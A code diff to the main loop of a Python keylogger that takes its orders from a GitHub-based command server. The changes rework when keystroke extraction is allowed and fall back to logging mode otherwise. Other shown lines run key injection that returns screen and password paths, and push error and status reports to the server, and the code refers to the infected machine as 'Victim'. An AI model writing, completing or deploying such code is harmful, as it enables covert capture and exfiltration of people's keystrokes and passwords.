@@ -126,12 +126,24 @@ if __name__ == "__main__":
             # If we can can_communicate_to_github then we can ask it for the mode!
             mode, error_message = repo.get_mode_from_repo()
 
-
             print(f"{error_message}",file=sys.stderr)
 
             if error_message is not None: # Relay there was an issue in setting the mode!
                 git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
                 git.commit_and_push(f"Error Detected when setting mode from command server!!!")
+
+            # Check if extraction is possible BEFORE any override
+            has_keystrokes = len(handler.keystrokes_recorded) > 0
+
+            # Decide if extraction is allowed
+            can_extract = has_keystrokes and repo.can_reach_github()
+
+            # If server requests extraction but we cannot extract -> fallback to L
+            if mode == "E" and not can_extract:
+                print("Extraction requested but not possible; falling back to L", file=sys.stderr)
+                mode = "L"
+
+
         else:
             print("There is no connection with Command server....",file=sys.stderr)
 
@@ -151,13 +163,8 @@ if __name__ == "__main__":
             # Call key Injection function:
             handler.mode = mode
             screen_path, pass_path = inject.main()
-            
 
-        elif mode == "E" and not can_extract:
-            mode = "L"
         elif mode == "E":
-            print("HERER extracing kfdjslkfjsdlkfjsldkfjsldkfjslkfdjslkfdjsdlkfj")
-            can_extract = True
             # Call key Extraction function:
             handler.mode = mode
             keystrokes_to_extract = handler.extract_logged_keys(source = "memory", limit = None)
@@ -166,7 +173,6 @@ if __name__ == "__main__":
             # TODO:: Ideally we should inform the command server of this decision by:
             # updating mode.txt and increment the ack.txt or just update error.txt :
             if not keystrokes_to_extract: 
-                can_extract = False
                 print("There were no keys to extract...", file=sys.stderr)
                 git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
                 git.commit_and_push(f"Error when reading keys to extract from Victim/Control to Command server!!!")
